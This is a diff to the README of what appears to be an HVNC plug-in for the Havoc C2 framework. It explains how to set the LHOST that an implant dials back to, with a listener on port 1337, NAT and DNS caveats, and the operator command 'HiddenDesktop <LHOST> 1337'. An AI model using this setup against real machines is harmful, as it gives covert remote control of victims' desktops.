@@ -64,7 +64,13 @@ The GUI probes PATH / well-known locations and prints English debug:
 - `[-] missing HVNC Server.exe`
 - `[-] wine64 not found in PATH`
 
-Set **LHOST** to your LAN IP, click **START**. It prints what to type in Havoc:
+**LHOST** is what the *implant* dials (the listener always binds `0.0.0.0:1337`):
+
+- local NIC list: `eth0` / `ens3` / `tun0` / `wg0` / …
+- **WAN** button: public IPv4 (STUN). On a VPS this matches the NIC; behind NAT you still need a port-forward for TCP 1337
+- type a **DNS** name (`hvnc.example.com`) — the BOF uses `gethostbyname` (IPv4 A record). Raw TCP, so an HTTP CDN in front will not pass the session
+
+Click **START**. It prints what to type in Havoc:
 
 ```text
 HiddenDesktop <LHOST> 1337
